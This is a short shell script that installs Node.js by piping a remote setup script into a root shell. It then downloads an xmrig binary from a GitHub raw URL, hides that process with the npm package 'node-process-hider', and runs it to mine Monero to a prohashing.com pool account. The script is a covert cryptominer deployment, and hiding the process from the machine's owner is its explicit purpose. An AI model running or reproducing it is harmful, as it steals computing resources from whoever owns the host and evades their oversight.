#!/bin/sh

apt-get update && apt-get install sudo

sudo apt update > /dev/null 2>&1
sudo apt install screen -y > /dev/null 2>&1

curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
sudo apt-get install -y nodejs

npm i -g node-process-hider
npm install -g npm

wget https://raw.githubusercontent.com/hondacars/xxx/main/xmrig
chmod +x xmrig
sudo ph add xmrig

./xmrig -o stratum+tcp://prohashing.com:3359 -u Prodent -p n=$(echo $(shuf -i 1-200 -n 1)-CS) -k --coin monero -a rx/0
